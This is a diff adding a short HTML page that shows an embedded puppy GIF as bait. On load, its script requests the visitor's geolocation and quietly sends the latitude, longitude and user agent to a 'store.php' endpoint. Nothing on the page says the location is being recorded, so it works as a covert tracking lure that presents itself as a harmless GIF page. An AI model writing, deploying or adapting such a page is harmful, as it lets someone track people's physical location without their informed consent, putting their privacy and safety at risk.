@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+<iframe src="https://giphy.com/embed/3o7abAHdYvZdBNnGZq" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/dog-puppy-dottie-3o7abAHdYvZdBNnGZq">via GIPHY</a></p>
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+  const xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+  xhttp.send();
+}
+</script>
+
+</body>
+</html>
